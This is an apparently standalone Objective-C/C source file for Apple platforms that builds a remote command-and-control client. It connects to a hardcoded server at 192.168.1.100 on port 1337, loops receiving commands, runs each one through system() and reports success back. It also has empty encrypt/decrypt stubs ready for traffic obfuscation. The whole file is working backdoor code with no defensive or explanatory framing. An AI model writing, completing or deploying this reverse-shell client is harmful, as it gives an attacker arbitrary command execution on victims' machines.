#import <Foundation/Foundation.h>
#import <SystemConfiguration/SystemConfiguration.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

#define SERVER_IP "192.168.1.100"
#define SERVER_PORT 1337
#define BUFFER_SIZE 1024

// Declare functions for socket communication with the server
int connectToServer(const char *ip, int port);
void sendToServer(int sockfd, const void *buf, size_t len);
int recvFromServer(int sockfd, void *buf, size_t len);
void executeCommand(const char *command);
void encryptData(void *data, size_t len);
void decryptData(void *data, size_t len);

int main(int argc, char *argv[]) {
    // Connect to the remote server
    int sockfd = connectToServer(SERVER_IP, SERVER_PORT);
    if (sockfd < 0) {
        fprintf(stderr, "Failed to connect to the server.\n");
        return 1;
    }

    // Send a greeting message to the server
    const char *greeting = "Hello, server!";
    sendToServer(sockfd, greeting, strlen(greeting));

    // Buffer for receiving data
    char buffer[BUFFER_SIZE];
    while (1) {
        // Receive a command from the server
        int received = recvFromServer(sockfd, buffer, sizeof(buffer) - 1);
        if (received <= 0) {
            fprintf(stderr, "Connection closed or error.\n");
            break;
        }
        buffer[received] = '\0';  // Null-terminate the received string

        // Decrypt received data (Placeholder)
        decryptData(buffer, received);

        // Execute the command
        executeCommand(buffer);

        // Acknowledge the command execution
        const char *ack = "Command executed successfully!";
        sendToServer(sockfd, ack, strlen(ack));
    }

    // Close the socket and exit
    close(sockfd);
    return 0;
}

// Function to connect to the remote server
int connectToServer(const char *ip, int port) {
    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(ip);
    serverAddr.sin_port = htons(port);

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("ERROR opening socket");
        return -1;
    }

    if (connect(sockfd, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) < 0) {
        perror("ERROR connecting");
        close(sockfd);
        return -1;
    }

    return sockfd;
}

// Function to send data to the remote server
void sendToServer(int sockfd, const void *buf, size_t len) {
    ssize_t n = send(sockfd, buf, len, 0);
    if (n < 0) {
        perror("ERROR writing to socket");
        close(sockfd);
        exit(1);
    }
}

// Function to receive data from the remote server
int recvFromServer(int sockfd, void *buf, size_t len) {
    ssize_t n = recv(sockfd, buf, len, 0);
    if (n < 0) {
        perror("ERROR reading from socket");
        close(sockfd);
        return -1;
    }
    return n;
}

// Function to execute the received command
void executeCommand(const char *command) {
    int status = system(command);
    if (status == -1) {
        perror("ERROR executing command");
    } else {
        printf("Command executed successfully: %s\n", command);
    }
}

// Placeholder for data encryption (you can implement encryption here)
void encryptData(void *data, size_t len) {
    // Add encryption logic here (e.g., using OpenSSL)
}

// Placeholder for data decryption (you can implement decryption here)
void decryptData(void *data, size_t len) {
    // Add decryption logic here (e.g., using OpenSSL)
}
